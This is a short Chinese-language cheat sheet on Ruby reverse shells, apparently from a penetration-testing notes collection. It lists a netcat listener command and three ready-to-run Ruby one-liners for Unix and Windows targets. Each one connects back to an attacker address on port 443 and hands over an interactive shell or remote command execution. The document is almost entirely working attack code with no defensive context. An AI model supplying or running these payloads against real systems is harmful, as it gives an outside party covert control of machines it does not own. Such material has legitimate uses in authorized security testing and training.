# Ruby脚本反弹shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443

```

然后在靶机上执行如下命令：

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.11",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

```

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

```

> Windows平台如下：

```ruby
ruby -rsocket -e 'c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

```

